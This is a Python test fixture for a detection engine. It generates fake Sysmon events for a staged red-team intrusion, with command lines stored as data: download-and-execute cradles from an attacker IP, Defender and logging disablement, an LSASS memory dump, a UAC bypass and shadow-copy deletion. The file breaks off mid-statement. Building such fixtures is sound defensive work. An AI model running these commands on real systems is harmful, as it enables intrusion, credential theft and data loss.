#!/usr/bin/env python3
"""Seed one incident that exercises every rule in the corpus.

seed_apt.py tells one attacker's story end to end. This script has a different
job: it is a regression fixture and a coverage demo, built to fire all 111 rules
-- across every EventID the engine understands (1, 2, 3, 6, 7, 8, 9, 10, 11,
12, 13, 15, 17, 20, 22, 23, 25) plus a handful of EventIDs no rule keys on (18,
19, 21) added purely so the incident's raw event stream and process tree show
the full breadth of what Sysmon reports -- while staying ONE incident:
everything hangs off a single process-tree root, and no gap between events
exceeds the correlation window, so the correlator never splits it in two.

That means trading realism for coverage. No real intrusion touches IIS, SQL
Server, PsExec, WMI/DCOM, CMSTP, and a phishing macro in the same twenty
minutes. Read this less as "an attacker" and more as "a red-team range built to
walk every technique the detection engineering README talks about" -- which is
exactly why the host is named WKSTN-RANGE-01 rather than a real employee's
machine. The phases, roughly in kill-chain order:

    explorer.exe
      └─ OUTLOOK.EXE                         phishing foothold
          ├─ WINWORD.EXE                     macro drops a script (SYS-051)
          │   └─ cmd.exe                     office spawns a shell (SYS-001)
          └─ mshta.exe                       HTA attachment (SYS-001, SYS-005)
              └─ cmd.exe ("ops")             dispatcher for everything below
                  ├─ encoded / cradle powershell, recon burst (whoami/net/
                  │   nltest/systeminfo), cscript encoded script host
                  ├─ registry tampering: Run key, Defender, IFEO, UAC-bypass
                  │   hijack, PS logging disabled, CLM lockdown removed,
                  │   netsh portproxy
                  ├─ LOLBAS: cmstp, regsvr32 Squiblydoo, certutil (download +
                  │   decode), Start-BitsTransfer, control.exe .cpl
                  ├─ three rundll32 children: bare (C2 + named pipe + beacon +
                  │   injection), comsvcs MiniDump (+ LSASS access), url.dll
                  │   OpenURL (+ child wscript)
                  ├─ masquerading svchost.exe, a PE stamped CALC.EXE staged in
                  │   Temp (SYS-092), a dropped payload.exe (BYOVD driver +
                  │   unmanaged PowerShell + startup persistence)
                  ├─ wmic.exe registering a WMI event consumer
                  ├─ ransomware.exe: shadow-copy deletion, a ransom note, and
                  │   several .locked files
                  ├─ coverage-expansion pass 1: schtasks /create, a service
                  │   pointed at a staged binary, a remote thread into LSASS,
                  │   a firewall allow rule, wevtutil cl, a passworded rar
                  │   archive, InstallUtil against a staged DLL, a remote
                  │   mshta HTA, hh.exe against a staged .chm, a remote MSI,
                  │   a net.exe admin-group add, sc stopping WinDefend,
                  │   sdelete, cipher /w, and RDP enabled via registry
                  │   (SYS-093 through SYS-107)
                  ├─ coverage-expansion pass 2: reg.exe saving the SAM hive,
                  │   procdump against lsass, ntdsutil NTDS.dit extraction,
                  │   mavinject injection, wsl -e, MSBuild against a staged
                  │   project, forfiles against a staged target, a tscon
                  │   session hijack, SharpHound, rclone, Rubeus, a
                  │   PowerShell v2 downgrade, an AMSI-bypass command line,
                  │   bitsadmin /transfer, a COM CLSID hijack, and a
                  │   token-theft tool keyword (SYS-108 through SYS-123)
                  ├─ coverage-expansion pass 3: a hollowed/doppelganged
                  │   process, RawCopy reading a volume directly, a
                  │   timestomped DLL, a DCSync request, and a
                  │   sekurlsa::logonpasswords command line, plus a DNS
                  │   query to a dynamic-DNS domain and a self-deleting
                  │   dropper reusing earlier actors (SYS-124 through
                  │   SYS-131)
                  └─ coverage-expansion pass 4: odbcconf REGSVR proxy exec,
                      mmc loading a staged .msc, a non-browser process
                      writing "Login Data" into Temp (both the process- and
                      path-based credential-DB rules at once), a KeePass
                      .kdbx touched by PowerShell, netstat -ano, a recursive
                      dir /s, tasklist piped through a Defender/SentinelOne
                      grep, a 7-Zip archive with -mhe, a curl -T upload,
                      SharpHound invoked via -CollectionMethod, and
                      Impacket's GetNPUsers.py -- rclone (SYS-143), netsh
                      interface (SYS-138), and net group/nltest (SYS-149)
                      are not repeated here: earlier phases already emit
                      command lines that satisfy those three (SYS-132,
                      SYS-133, SYS-135, SYS-136, SYS-137, SYS-139, SYS-140,
                      SYS-141, SYS-142, SYS-144, SYS-148, SYS-150)
              └─ ftp.exe -s:script -> cmd.exe               (SYS-079)
      ├─ coverage-expansion pass 5: ClickFix/FileFix, direct children of
      │   explorer.exe rather than "ops" -- a decoy CAPTCHA-lure paste, a
      │   bypass+hidden PowerShell cradle, mshta named straight in the Run
      │   dialog, and a second-stage PowerShell that pulls its payload back
      │   out of the clipboard (SYS-151 through SYS-154)
      ├─ coverage-expansion pass 6: a remote-access tool (AnyDesk) dropped
      │   and installed silently rather than double-clicked, a PowerShell
      │   clipboard-hijack pattern (read then overwrite), and Problem Steps
      │   Recorder abused for silent screenshot collection
      │   (SYS-155 through SYS-158)
      ├─ wmiprvse.exe          remote WMI/DCOM persistence   (SYS-078)
      ├─ PSEXESVC.exe          lateral movement arrival      (SYS-072, SYS-073)
      ├─ w3wp.exe -> cmd.exe, appcmd.exe                     (SYS-088/038/039)
      ├─ sqlservr.exe -> cmd.exe                             (SYS-089)
      ├─ wsmprovhost.exe -> hostname.exe                     (SYS-090)
      └─ lsass.exe             direct SAM write              (SYS-091)

    python scripts/seed_full_coverage.py
"""

from __future__ import annotations

import argparse
import random
from datetime import datetime, timedelta, timezone

import httpx

from seed_common import EventFactory, post_events

HOST = "WKSTN-RANGE-01"
USER = "CORP\\redteam.ops"
BASE = datetime.now(timezone.utc) - timedelta(minutes=15)

# All 88 rule IDs the corpus ships today, so main() can report exactly what
# (if anything) did not fire.
EXPECTED_RULES = {
    "SYS-001", "SYS-002", "SYS-003", "SYS-004", "SYS-005", "SYS-006", "SYS-007",
    "SYS-008", "SYS-009", "SYS-010", "SYS-020", "SYS-021", "SYS-030", "SYS-031",
    "SYS-032", "SYS-034", "SYS-035", "SYS-036", "SYS-037", "SYS-038", "SYS-039",
    "SYS-040", "SYS-041", "SYS-050", "SYS-051", "SYS-060", "SYS-070", "SYS-071",
    "SYS-072", "SYS-073", "SYS-074", "SYS-075", "SYS-076", "SYS-077", "SYS-078",
    "SYS-079", "SYS-080", "SYS-081", "SYS-082", "SYS-083", "SYS-084", "SYS-085",
    "SYS-086", "SYS-087", "SYS-088", "SYS-089", "SYS-090", "SYS-091", "SYS-092",
    "SYS-093", "SYS-094", "SYS-095", "SYS-096", "SYS-097", "SYS-098", "SYS-099",
    "SYS-100", "SYS-101", "SYS-102", "SYS-103", "SYS-104", "SYS-105", "SYS-106",
    "SYS-107", "SYS-108", "SYS-109", "SYS-110", "SYS-111", "SYS-112", "SYS-113",
    "SYS-114", "SYS-115", "SYS-116", "SYS-117", "SYS-118", "SYS-119", "SYS-120",
    "SYS-121", "SYS-122", "SYS-123", "SYS-124", "SYS-125", "SYS-126", "SYS-127",
    "SYS-128", "SYS-129", "SYS-130", "SYS-131", "SYS-132", "SYS-133", "SYS-135",
    "SYS-136", "SYS-137", "SYS-138", "SYS-139", "SYS-140", "SYS-141", "SYS-142",
    "SYS-143", "SYS-144", "SYS-148", "SYS-149", "SYS-150", "SYS-151", "SYS-152",
    "SYS-153", "SYS-154", "SYS-155", "SYS-156", "SYS-157", "SYS-158",
}


# at()/proc()/raw_event() moved to seed_common.py, shared with seed_apt.py
# and seed_rw.py -- this script's proc() (with automatic ParentImage lookup
# via a guid->image map, and a per-call `user` override) was the most
# complete of the three copies, and is now EventFactory's implementation.
# Bound as plain names so events() below, which calls them bare throughout,
# did not need to change.
_factory = EventFactory(
    host=HOST,
    user=USER,
    base=BASE,
    logon_id="0x9a41f7",
    default_cwd=r"C:\Users\redteam.ops\Downloads",
)
at = _factory.at
proc = _factory.proc
raw_event = _factory.raw_event


# GUIDs for every actor in the tree. A handful (wmiprvse, PSEXESVC, w3wp,
# sqlservr, wsmprovhost, lsass) are parented directly under root rather than
# under "ops": they represent arrivals from the network (WMI/DCOM, PsExec,
# already-running services) rather than children of the phishing chain, but
# they still share the same root so the correlator keeps everything as one
# incident.
G = {
    "root": "{rng-explorer}",
    "outlook": "{rng-outlook}",
    "word": "{rng-word}",
    "word_cmd": "{rng-word-cmd}",
    "mshta": "{rng-mshta}",
    "ops": "{rng-ops-cmd}",
    "ps_enc": "{rng-ps-enc}",
    "ps_cradle": "{rng-ps-cradle}",
    "whoami": "{rng-whoami}",
    "net": "{rng-net}",
    "nltest": "{rng-nltest}",
    "systeminfo": "{rng-systeminfo}",
    "cscript_enc": "{rng-cscript-enc}",
    "reg_run": "{rng-reg-run}",
    "reg_defender": "{rng-reg-defender}",
    "reg_ifeo": "{rng-reg-ifeo}",
    "ps_uac": "{rng-ps-uac}",
    "reg_pslog": "{rng-reg-pslog}",
    "ps_clm": "{rng-ps-clm}",
    "netsh": "{rng-netsh}",
    "cmstp": "{rng-cmstp}",
    "regsvr32": "{rng-regsvr32}",
    "certutil_dl": "{rng-certutil-dl}",
    "certutil_dec": "{rng-certutil-dec}",
    "bits": "{rng-bits}",
    "cpl": "{rng-cpl}",
    "rundll_bare": "{rng-rundll-bare}",
    "rundll_dump": "{rng-rundll-dump}",
    "rundll_url": "{rng-rundll-url}",
    "wscript_child": "{rng-wscript-child}",
    "svchost_masq": "{rng-svchost-masq}",
    "calc_masq": "{rng-calc-masq}",
    "payload": "{rng-payload}",
    "wmic": "{rng-wmic}",
    "wmiprvse": "{rng-wmiprvse}",
    "ftp": "{rng-ftp}",
    "ftp_cmd": "{rng-ftp-cmd}",
    "psexec": "{rng-psexec}",
    "w3wp": "{rng-w3wp}",
    "w3wp_cmd": "{rng-w3wp-cmd}",
    "appcmd": "{rng-appcmd}",
    "sqlservr": "{rng-sqlservr}",
    "sql_cmd": "{rng-sql-cmd}",
    "wsmprovhost": "{rng-wsmprovhost}",
    "hostname": "{rng-hostname}",
    "lsass": "{rng-lsass}",
    "ransom": "{rng-ransom}",
    # Coverage-expansion pass (SYS-093 through SYS-107).
    "schtasks": "{rng-schtasks}",
    "svc_installer": "{rng-svc-installer}",
    "netsh_fw": "{rng-netsh-fw}",
    "wevtutil": "{rng-wevtutil}",
    "rar_archive": "{rng-rar-archive}",
    "installutil": "{rng-installutil}",
    "mshta_remote": "{rng-mshta-remote}",
    "hh_help": "{rng-hh-help}",
    "msiexec_remote": "{rng-msiexec-remote}",
    "net_admin": "{rng-net-admin}",
    "sc_stop": "{rng-sc-stop}",
    "sdelete": "{rng-sdelete}",
    "cipher_wipe": "{rng-cipher-wipe}",
    "reg_rdp": "{rng-reg-rdp}",
    # Coverage-expansion pass 2 (SYS-108 through SYS-123).
    "reg_hive_dump": "{rng-reg-hive-dump}",
    "procdump": "{rng-procdump}",
    "ntdsutil": "{rng-ntdsutil}",
    "mavinject": "{rng-mavinject}",
    "wsl": "{rng-wsl}",
    "msbuild": "{rng-msbuild}",
    "forfiles": "{rng-forfiles}",
    "tscon": "{rng-tscon}",
    "sharphound": "{rng-sharphound}",
    "rclone": "{rng-rclone}",
    "rubeus": "{rng-rubeus}",
    "ps_downgrade": "{rng-ps-downgrade}",
    "ps_amsi": "{rng-ps-amsi}",
    "bitsadmin": "{rng-bitsadmin}",
    "com_hijack": "{rng-com-hijack}",
    "juicypotato": "{rng-juicypotato}",
    # Coverage-expansion pass 3 (SYS-124 through SYS-131).
    "hollow_host": "{rng-hollow-host}",
    "rawcopy": "{rng-rawcopy}",
    "timestomp": "{rng-timestomp}",
    "dcsync": "{rng-dcsync}",
    "mimikatz_sekurlsa": "{rng-mimikatz-sekurlsa}",
    # Coverage-expansion pass 4 (SYS-132 through SYS-150).
    "odbcconf": "{rng-odbcconf}",
    "mmc_console": "{rng-mmc-console}",
    "cred_stager": "{rng-cred-stager}",
    "keepass_touch": "{rng-keepass-touch}",
    "netstat_enum": "{rng-netstat-enum}",
    "dir_recurse": "{rng-dir-recurse}",
    "av_discovery": "{rng-av-discovery}",
    "archive_mhe": "{rng-archive-mhe}",
    "curl_upload": "{rng-curl-upload}",
    "sharphound_ps1": "{rng-sharphound-ps1}",
    "asrep_roast": "{rng-asrep-roast}",
    # Coverage-expansion pass 5: ClickFix/FileFix (SYS-151 through SYS-154).
    "clickfix_lure": "{rng-clickfix-lure}",
    "clickfix_bypass": "{rng-clickfix-bypass}",
    "clickfix_mshta": "{rng-clickfix-mshta}",
    "clickfix_clip": "{rng-clickfix-clip}",
    # Coverage-expansion pass 6: RMM abuse + collection gaps (SYS-155..158).
    "rmm_tool": "{rng-rmm-tool}",
    "clip_hijack": "{rng-clip-hijack}",
    "psr_capture": "{rng-psr-capture}",
}


def events() -> list[dict]:
    ev: list[dict] = []
    t = 0.0

    def step(n: float = 1.0) -> float:
        nonlocal t
        t += n
        return t

    # --- Foothold: explorer -> Outlook (benign, builds the tree top) ---
    ev.append(proc(step(0), G["root"], "{rng-boot}", r"C:\Windows\explorer.exe",
                    "explorer.exe", pid=3120, ppid=780))
    ev.append(proc(step(2), G["outlook"], G["root"],
                    r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
                    '"OUTLOOK.EXE"', pid=4212, ppid=3120))

    # --- WINWORD.EXE drops a script (SYS-051) then spawns a shell (SYS-001) ---
    ev.append(proc(step(3), G["word"], G["outlook"],
                    r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                    r'"WINWORD.EXE" /n "C:\Users\redteam.ops\Downloads\Invoice_Q3.docm"',
                    pid=4388, ppid=4212,
                    hashes="SHA256=9f2b4a1c8e7d3f6a0b5c9e2d1f4a7b8c"))
    ev.append(raw_event(11, step(1), Image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                         ProcessGuid=G["word"],
                         TargetFilename=r"C:\Users\redteam.ops\AppData\Local\Temp\dropper.vbs"))
    ev.append(proc(step(1), G["word_cmd"], G["word"], r"C:\Windows\System32\cmd.exe",
                    r'cmd.exe /c cscript.exe //nologo dropper.vbs', pid=4402, ppid=4388,
                    parent_cmdline=r'"WINWORD.EXE" /n "Invoice_Q3.docm"'))

    # --- mshta.exe: second phishing vector, direct child of Outlook (SYS-001 + SYS-005) ---
    ev.append(proc(step(2), G["mshta"], G["outlook"], r"C:\Windows\System32\mshta.exe",
                    r'mshta.exe "C:\Users\redteam.ops\Downloads\Remittance.hta"',
                    pid=4460, ppid=4212))

    # --- "ops": the dispatcher every later branch hangs off ---
    ev.append(proc(step(1), G["ops"], G["mshta"], r"C:\Windows\System32\cmd.exe",
                    "cmd.exe /c start /min", pid=4510, ppid=4460))

    # === Execution / obfuscation ===
    ev.append(proc(step(1), G["ps_enc"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -w hidden -enc "
                    r"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAn",
                    pid=4600, ppid=4510))
    ev.append(proc(step(1), G["ps_cradle"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient)."
                    r"DownloadString('http://45.132.192.68/stage2.ps1')\"",
                    pid=4610, ppid=4510))
    ev.append(raw_event(3, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         ProcessGuid=G["ps_cradle"], DestinationIp="45.132.192.68",
                         DestinationPort="443", DestinationHostname="cdn-edge-7.telemetry-sync.net"))
    ev.append(raw_event(22, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         ProcessGuid=G["ps_cradle"], QueryName="cdn-edge-7.telemetry-sync.net",
                         QueryResults="45.132.192.68"))

    # --- Recon burst under the cradle (4 distinct techniques -> discovery bonus) ---
    ev.append(proc(step(2), G["whoami"], G["ps_cradle"], r"C:\Windows\System32\whoami.exe",
                    "whoami /all", pid=4700, ppid=4610))
    ev.append(proc(step(1), G["net"], G["ps_cradle"], r"C:\Windows\System32\net.exe",
                    'net group "Domain Admins" /domain', pid=4710, ppid=4610))
    ev.append(proc(step(1), G["nltest"], G["ps_cradle"], r"C:\Windows\System32\nltest.exe",
                    "nltest /dclist:corp.local", pid=4720, ppid=4610))
    ev.append(proc(step(1), G["systeminfo"], G["ps_cradle"], r"C:\Windows\System32\systeminfo.exe",
                    "systeminfo", pid=4730, ppid=4610))

    ev.append(proc(step(1), G["cscript_enc"], G["ops"], r"C:\Windows\System32\cscript.exe",
                    r'cscript.exe //B /e:jscript.encode C:\Users\redteam.ops\AppData\Local\Temp\update.jse',
                    pid=4740, ppid=4510))

    # === Persistence / defense evasion (registry) ===
    ev.append(proc(step(1), G["reg_run"], G["ops"], r"C:\Windows\System32\reg.exe",
                    r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run "
                    r"/v OneDriveSync /t REG_SZ /d C:\Users\redteam.ops\AppData\Roaming\sync.exe /f",
                    pid=4750, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", ProcessGuid=G["reg_run"],
                         TargetObject=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync",
                         Details=r"C:\Users\redteam.ops\AppData\Roaming\sync.exe"))

    ev.append(proc(step(1), G["reg_defender"], G["ops"], r"C:\Windows\System32\reg.exe",
                    r"reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender "
                    r"/v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f",
                    pid=4760, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", ProcessGuid=G["reg_defender"],
                         TargetObject=r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableRealtimeMonitoring",
                         Details="DWORD (0x00000001)"))

    ev.append(proc(step(1), G["reg_ifeo"], G["ops"], r"C:\Windows\System32\reg.exe",
                    r"reg add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution "
                    r"Options\sethc.exe\" /v Debugger /t REG_SZ /d C:\Windows\System32\cmd.exe /f",
                    pid=4770, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", ProcessGuid=G["reg_ifeo"],
                         TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger",
                         Details=r"C:\Windows\System32\cmd.exe"))

    ev.append(proc(step(1), G["ps_uac"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -c \"New-Item -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' "
                    r"-Force; Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' "
                    r"-Name '(default)' -Value 'C:\Windows\System32\cmd.exe /c calc.exe'\"",
                    pid=4780, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         ProcessGuid=G["ps_uac"],
                         TargetObject=r"HKCU\Software\Classes\ms-settings\shell\open\command\(Default)",
                         Details=r"C:\Windows\System32\cmd.exe /c calc.exe"))

    ev.append(proc(step(1), G["reg_pslog"], G["ops"], r"C:\Windows\System32\reg.exe",
                    r"reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging "
                    r"/v EnableScriptBlockLogging /t REG_DWORD /d 0 /f",
                    pid=4790, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", ProcessGuid=G["reg_pslog"],
                         TargetObject=r"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging",
                         Details="DWORD (0x00000000)"))

    ev.append(proc(step(1), G["ps_clm"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -c \"Remove-ItemProperty -Path "
                    r"'HKLM:\System\CurrentControlSet\Control\SESSION MANAGER\Environment' "
                    r"-Name __PSLockdownPolicy\"",
                    pid=4800, ppid=4510))
    ev.append(raw_event(12, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         ProcessGuid=G["ps_clm"], EventType="DeleteValue",
                         TargetObject=r"HKLM\System\CurrentControlSet\Control\SESSION MANAGER\Environment\__PSLockdownPolicy"))

    ev.append(proc(step(1), G["netsh"], G["ops"], r"C:\Windows\System32\netsh.exe",
                    "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 "
                    "connectport=3389 connectaddress=10.10.10.5",
                    pid=4810, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\netsh.exe", ProcessGuid=G["netsh"],
                         TargetObject=r"HKLM\System\CurrentControlSet\services\PortProxy\v4tov4\tcp\0.0.0.0/8080",
                         Details="10.10.10.5/3389"))

    # === LOLBAS / additional execution vectors ===
    ev.append(proc(step(1), G["cmstp"], G["ops"], r"C:\Windows\System32\cmstp.exe",
                    r'"C:\Windows\System32\cmstp.exe" /au C:\Users\redteam.ops\AppData\Local\Temp\evil.inf',
                    pid=4820, ppid=4510))

    ev.append(proc(step(1), G["regsvr32"], G["ops"], r"C:\Windows\System32\regsvr32.exe",
                    "regsvr32.exe /s /u /i:http://45.132.192.68/evil.sct scrobj.dll",
                    pid=4830, ppid=4510))
    ev.append(raw_event(3, step(0), Image=r"C:\Windows\System32\regsvr32.exe", ProcessGuid=G["regsvr32"],
                         DestinationIp="45.132.192.68", DestinationPort="80",
                         DestinationHostname="45.132.192.68"))

    ev.append(proc(step(1), G["certutil_dl"], G["ops"], r"C:\Windows\System32\certutil.exe",
                    "certutil.exe -urlcache -split -f http://45.132.192.68/stage3.exe "
                    r"C:\Users\redteam.ops\AppData\Local\Temp\stage3.exe",
                    pid=4840, ppid=4510))
    ev.append(raw_event(3, step(0), Image=r"C:\Windows\System32\certutil.exe", ProcessGuid=G["certutil_dl"],
                         DestinationIp="45.132.192.68", DestinationPort="80",
                         DestinationHostname="45.132.192.68"))

    ev.append(proc(step(1), G["certutil_dec"], G["ops"], r"C:\Windows\System32\certutil.exe",
                    r"certutil.exe -decode payload.b64 payload.exe", pid=4850, ppid=4510))

    ev.append(proc(step(1), G["bits"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"Start-BitsTransfer -Source http://45.132.192.68/stage4.exe "
                    r"-Destination C:\Users\redteam.ops\AppData\Local\Temp\stage4.exe",
                    pid=4860, ppid=4510))

    ev.append(proc(step(1), G["cpl"], G["ops"], r"C:\Windows\System32\control.exe",
                    r"control.exe C:\Users\redteam.ops\Downloads\Invoice.cpl", pid=4870, ppid=4510))

    # === Three rundll32 children ===
    # 1) Bare rundll32: injected C2, named pipe, beacon loop, injection into explorer
    ev.append(proc(step(1), G["rundll_bare"], G["ops"], r"C:\Windows\System32\rundll32.exe",
                    "rundll32.exe", pid=4880, ppid=4510))
    ev.append(raw_event(17, step(1), Image=r"C:\Windows\System32\rundll32.exe",
                         ProcessGuid=G["rundll_bare"], PipeName=r"\msagent_7e"))
    ev.append(raw_event(18, step(0), Image=r"C:\Windows\System32\rundll32.exe",
                         ProcessGuid=G["rundll_bare"], PipeName=r"\msagent_7e"))
    ev.append(raw_event(8, step(1), SourceImage=r"C:\Windows\System32\rundll32.exe",
                         SourceProcessGUID=G["rundll_bare"], TargetImage=r"C:\Windows\explorer.exe",
                         TargetProcessGuid=G["root"], NewThreadId="9412"))
    ev.append(raw_event(22, step(1), Image=r"C:\Windows\System32\rundll32.exe",
                         ProcessGuid=G["rundll_bare"], QueryName="cdn-edge-7.telemetry-sync.net",
                         QueryResults="45.132.192.68"))
    random.seed(4242)
    clock = step(2)
    for _ in range(8):
        ev.append(raw_event(3, clock, Image=r"C:\Windows\System32\rundll32.exe",
                             ProcessGuid=G["rundll_bare"], DestinationIp="45.132.192.68",
                             DestinationPort="4444", DestinationHostname="cdn-edge-7.telemetry-sync.net"))
        clock = step(40 * (1 - random.uniform(0, 0.3)))

    # 2) comsvcs.dll MiniDump against LSASS
    ev.append(proc(step(1), G["rundll_dump"], G["ops"], r"C:\Windows\System32\rundll32.exe",
                    r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 668 "
                    r"C:\Windows\Temp\lsass2.dmp full",
                    pid=4900, ppid=4510, integrity="High"))
    ev.append(raw_event(10, step(1), SourceImage=r"C:\Windows\System32\rundll32.exe",
                         SourceProcessGUID=G["rundll_dump"], TargetImage=r"C:\Windows\System32\lsass.exe",
                         GrantedAccess="0x1410", User=USER))

    # 3) url.dll,OpenURL -> spawns wscript.exe
    ev.append(proc(step(1), G["rundll_url"], G["ops"], r"C:\Windows\System32\rundll32.exe",
                    r"rundll32.exe url.dll,OpenURL file://C:/Users/redteam.ops/Downloads/stage5.hta",
                    pid=4910, ppid=4510))
    ev.append(proc(step(1), G["wscript_child"], G["rundll_url"], r"C:\Windows\System32\wscript.exe",
                    r"wscript.exe C:\Users\redteam.ops\Downloads\stage5.js", pid=4920, ppid=4910))

    # === Masquerading, dropped payload, BYOVD, unmanaged PowerShell, startup persistence ===
    ev.append(proc(step(1), G["svchost_masq"], G["ops"], r"C:\Users\Public\svchost.exe",
                    "svchost.exe -k netsvcs", pid=4930, ppid=4510))

    # PE metadata masquerade: internally stamped CALC.EXE, staged in Temp.
    ev.append(proc(step(1), G["calc_masq"], G["ops"],
                    r"C:\Users\redteam.ops\AppData\Local\Temp\Dyxxur4gx.exe",
                    r'"Dyxxur4gx.exe"', pid=4935, ppid=4510,
                    OriginalFileName="CALC.EXE", Description="Windows Calculator",
                    Company="Microsoft Corporation"))

    ev.append(proc(step(1), G["payload"], G["ops"],
                    r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
                    r"update.exe -install", pid=4940, ppid=4510, integrity="High"))
    ev.append(raw_event(6, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
                         ProcessGuid=G["payload"], ImageLoaded=r"C:\Windows\Temp\rtcore64.sys",
                         Signed="false", Signature="(Unsigned)"))
    ev.append(raw_event(7, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
                         ProcessGuid=G["payload"],
                         ImageLoaded=r"C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation"
                         r"\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll"))
    ev.append(raw_event(11, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
                         ProcessGuid=G["payload"],
                         TargetFilename=r"C:\Users\redteam.ops\AppData\Roaming\Microsoft\Windows\Start Menu"
                         r"\Programs\Startup\update.lnk"))
    ev.append(raw_event(23, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
                         ProcessGuid=G["payload"],
                         TargetFilename=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe.tmp"))

    # === WMI event-consumer persistence ===
    ev.append(proc(step(1), G["wmic"], G["ops"], r"C:\Windows\System32\wbem\WMIC.exe",
                    r'"C:\Windows\System32\wbem\WMIC.exe" /namespace:"\\root\subscription" '
                    r'PATH CommandLineEventConsumer CREATE Name="WinUpdater", '
                    r'ExecutablePath="cmd.exe", CommandLineTemplate="cmd.exe /c calc.exe"',
                    pid=4950, ppid=4510))
    ev.append(raw_event(19, step(1), ProcessGuid=G["wmic"], EventType="WmiFilterEvent",
                         Operation="Created", User=USER, EventNamespace=r"root\cimv2",
                         Name="WinUpdaterFilter"))
    ev.append(raw_event(20, step(1), ProcessGuid=G["wmic"], EventType="WmiConsumerEvent",
                         Operation="Created", User=USER, Name="WinUpdater",
                         Type="Command Line", Destination="cmd.exe /c calc.exe"))
    ev.append(raw_event(21, step(1), ProcessGuid=G["wmic"], EventType="WmiBindingEvent",
                         Operation="Created", User=USER,
                         Consumer='CommandLineEventConsumer.Name="WinUpdater"',
                         Filter='__EventFilter.Name="WinUpdaterFilter"'))

    # === Ransomware finale, off "ops" ===
    ev.append(proc(step(2), G["ransom"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\ransom.exe",
                    "ransom.exe --encrypt", pid=4960, ppid=4510, integrity="High"))
    ev.append(proc(step(1), "{rng-vssadmin}", G["ransom"], r"C:\Windows\System32\vssadmin.exe",
                    "vssadmin.exe delete shadows /all /quiet", pid=4970, ppid=4960, integrity="High"))
    ev.append(raw_event(11, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\ransom.exe",
                         ProcessGuid=G["ransom"],
                         TargetFilename=r"C:\Users\redteam.ops\Desktop\HOW_TO_DECRYPT_FILES.txt"))
    for name in ("Finance_Q3.xlsx", "Board_Minutes.docx", "Customer_List.csv"):
        ev.append(raw_event(11, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\ransom.exe",
                             ProcessGuid=G["ransom"],
                             TargetFilename=rf"C:\Users\redteam.ops\Documents\{name}.locked"))
    ev.append(raw_event(23, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\ransom.exe",
                         ProcessGuid=G["ransom"],
                         TargetFilename=r"C:\Users\redteam.ops\AppData\Local\Microsoft\Windows\Backup\catalog.wbcat"))

    # === Coverage-expansion pass: SYS-093 through SYS-107, off "ops" ===
    ev.append(proc(step(1), G["schtasks"], G["ops"], r"C:\Windows\System32\schtasks.exe",
                    r"schtasks /create /tn WinUpdaterTask /tr "
                    r"C:\Users\redteam.ops\AppData\Roaming\sync2.exe /sc onlogon /ru SYSTEM",
                    pid=5100, ppid=4510))

    ev.append(proc(step(1), G["svc_installer"], G["ops"], r"C:\Windows\System32\sc.exe",
                    r"sc.exe create WinUpdSvc binPath= "
                    r"C:\Users\redteam.ops\AppData\Local\Temp\svc.exe start= auto",
                    pid=5110, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\sc.exe", ProcessGuid=G["svc_installer"],
